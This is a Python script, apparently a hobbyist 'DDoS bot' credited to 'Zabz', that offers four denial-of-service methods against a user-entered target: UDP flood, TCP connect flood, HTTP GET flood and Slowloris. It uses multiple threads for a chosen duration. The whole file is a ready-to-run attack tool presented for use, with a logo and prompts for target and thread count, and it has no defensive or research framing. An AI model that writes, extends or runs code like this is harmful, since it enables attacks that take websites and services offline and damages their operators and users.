import socket
import threading
import time
import random
import sys
import os
from urllib.parse import urlparse

# --- ANSI Color Code for Green ---
GREEN = '\033[92m'
RESET = '\033[0m'

# --- ASCII Art Logo ---
LOGO = GREEN + """
    ⠀⢸⣿⣧⡀⠀⣠⣴⣶⣶⣶⣶⣶⣦⣤⣀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠨⣿⣿⣷⣜⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀ ⢻⣿⣿⣷⣦⣀⣉⣽⣿⣿⣿⣿⣍⣁⣠⣾⣿⣿⣿⠁⠀⠀⠀⠀⣀⣀⡙⣷⣦⣄⠀⠀⠀
⠀⠀⠀  ⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣠⣴⣾⠿⠟⣛⣭⣿⡿⠿⢿⣦⡀
⠀  ⠀⠀⠀ ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣅⣴⣿⡿⠟⠁⠀⠀⢸⠭⠋⠁⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀ ⠀⠉⠛⠿⣿⣿⣿⣿⣿⡿⠟⠋⣹⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + RESET

AUTHOR = GREEN + "Made by Zabz" + RESET

# --- Attack Methods ---
def udp_flood(target_ip, target_port, duration):
    """Sends a high volume of UDP packets."""
    timeout = time.time() + duration
    payload = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        try:
            sock.sendto(payload, (target_ip, target_port))
        except:
            pass
    sock.close()

def tcp_flood(target_ip, target_port, duration):
    """Opens and closes many TCP connections."""
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.sendto(("GET /" + "A" * 1024).encode('ascii'), (target_ip, target_port))
            s.close()
        except:
            pass

def http_flood(target_url, duration):
    """Sends a high volume of HTTP GET requests."""
    timeout = time.time() + duration
    parsed_url = urlparse(target_url)
    host = parsed_url.hostname
    path = parsed_url.path if parsed_url.path else "/"
    port = parsed_url.port if parsed_url.port else 80

    payload = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            s.send(payload.encode())
            s.close()
        except:
            pass

def slowloris(target_ip, target_port, duration):
    """Sends incomplete HTTP requests to keep connections open."""
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.send("GET / HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            # Keep sending headers to keep connection alive
            while time.time() < timeout:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(5)
            s.close()
        except:
            pass

# --- Main Bot Class ---
class AKDDoSBot:
    def __init__(self, attack_type, target, port=80, duration=60):
        self.attack_type = attack_type.lower()
        self.target = target
        self.port = port
        self.duration = duration

    def run_attack(self):
        if self.attack_type == 'udp':
            udp_flood(self.target, self.port, self.duration)
        elif self.attack_type == 'tcp':
            tcp_flood(self.target, self.port, self.duration)
        elif self.attack_type == 'http':
            http_flood(self.target, self.duration)
        elif self.attack_type == 'slowloris':
            slowloris(self.target, self.port, self.duration)
        else:
            print(f"{GREEN}[!] Unknown attack type: {self.attack_type}{RESET}")

# --- Main Controller ---
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LOGO)
    print(AUTHOR)
    print(GREEN + "-" * 60 + RESET)

    attack_type = input(f"{GREEN}Attack type (UDP/TCP/HTTP/Slowloris): {RESET}").strip().lower()
    target_input = input(f"{GREEN}Target (URL or IP): {RESET}").strip()
    num_bots = int(input(f"{GREEN}Number of bots (threads): {RESET}"))
    duration = int(input(f"{GREEN}Attack duration in seconds: {RESET}"))

    # Resolve target
    target_ip = None
    port = 80 # Default port
    if attack_type in ['udp', 'tcp', 'slowloris']:
        try:
            if '://' in target_input:
                parsed = urlparse(target_input)
                target_ip = socket.gethostbyname(parsed.hostname)
                port = parsed.port if parsed.port else 80
            else:
                target_ip = socket.gethostbyname(target_input.split(':')[0])
                if ':' in target_input:
                    port = int(target_input.split(':')[1])
        except socket.gaierror:
            print(f"{GREEN}[!] Invalid target IP or hostname.{RESET}")
            sys.exit(1)
    elif attack_type == 'http':
        if not target_input.startswith(('http://', 'https://')):
            target_input = 'http://' + target_input

    print(f"{GREEN}[*] Starting attack on {target_input if attack_type == 'http' else target_ip + ':' + str(port)}{RESET}")
    print(f"{GREEN}[*] Using {num_bots} bots for {duration} seconds with {attack_type} attack.{RESET}")

    threads = []
    for _ in range(num_bots):
        if attack_type == 'http':
            bot = AKDDoSBot(attack_type, target_input, duration=duration)
        else:
            bot = AKDDoSBot(attack_type, target_ip, port, duration)
        thread = threading.Thread(target=bot.run_attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"{GREEN}[*] Attack finished.{RESET}")

if __name__ == "__main__":
    main()
